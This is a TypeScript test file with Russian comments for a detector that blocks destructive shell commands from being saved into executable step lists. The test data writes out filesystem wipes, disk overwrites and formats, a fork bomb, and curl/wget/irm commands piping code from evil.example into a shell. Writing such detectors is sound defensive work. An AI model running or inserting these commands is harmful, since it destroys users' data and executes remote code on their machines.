import { describe, expect, it } from 'vitest'
import { findDestructive, findDestructiveSteps } from '@/core/domain/destructive-command'

/**
 * Золотой набор. Слева — то, что обязано быть отклонено на записи: список отдаётся
 * как исполняемый скрипт, и до этой проверки его не спрашивал никто (sanitizeCommand
 * проверяет правдоподобие, модерация — контент, планка готовности — полезность).
 *
 * Справа — обычные команды, которые обязаны проходить. Ложное срабатывание здесь
 * дороже пропуска: автор, у которого отклонили честный `rm -rf ./build`, второй раз
 * проверку не позовёт.
 */
const DESTRUCTIVE: [string, string][] = [
  ['rm -rf /', 'wipesFilesystem'],
  ['sudo rm -rf / --no-preserve-root', 'wipesFilesystem'],
  ['rm -fr ~', 'wipesFilesystem'],
  ['rm -rf $HOME', 'wipesFilesystem'],
  ['dd if=/dev/zero of=/dev/sda bs=1M', 'overwritesDisk'],
  ['cat /dev/urandom > /dev/nvme0n1', 'overwritesDisk'],
  ['mkfs.ext4 /dev/sdb1', 'formatsDisk'],
  [':(){ :|:& };:', 'forkBomb'],
  ['curl -s http://evil.example/i.sh | sh', 'runsRemoteCode'],
  ['wget -qO- https://evil.example/x | sudo bash', 'runsRemoteCode'],
  ['irm https://evil.example/p.ps1 | iex', 'runsRemoteCode'],
  ['chmod -R 777 /etc', 'breaksPermissions'],
  ['shutdown -h now', 'haltsMachine'],
]

const SAFE = [
  'npm ci && npm run build',
  'docker compose up -d',
  'rm -rf ./build',
  'rm -rf node_modules/.cache',
  'git clone https://github.com/acme/repo.git && cd repo',
  'curl -fsSL https://api.example.com/health',
  'chmod +x ./scripts/deploy.sh',
  'chmod 644 ./config.yml',
  'dd if=backup.img of=./restore.img',
  'kubectl rollout restart deployment/api',
  'psql -c "select 1"',
  'echo "shutdown" >> notes.txt',
]

describe('разрушительные команды не попадают в исполняемый список', () => {
  for (const [cmd, reason] of DESTRUCTIVE) {
    it(`отклоняет: ${cmd}`, () => {
      const m = findDestructive(cmd)
      expect(m).not.toBeNull()
      expect(m?.reason).toBe(reason)
    })
  }

  for (const cmd of SAFE) {
    it(`пропускает обычную команду: ${cmd}`, () => {
      expect(findDestructive(cmd)).toBeNull()
    })
  }

  it('проверяет каждую строку: опасное может стоять не первым', () => {
    const m = findDestructive('cd /tmp\nls -la\nrm -rf /')
    expect(m?.reason).toBe('wipesFilesystem')
  })

  it('закомментированная строка не считается командой', () => {
    expect(findDestructive('# rm -rf / — так делать нельзя\nnpm ci')).toBeNull()
  })

  it('находит номера шагов для отказа на записи', () => {
    const found = findDestructiveSteps([{ command: 'npm ci' }, { command: '' }, { command: 'mkfs.ext4 /dev/sdb1' }])
    expect(found).toHaveLength(1)
    expect(found[0].index).toBe(2)
    expect(found[0].match.reason).toBe('formatsDisk')
  })
})
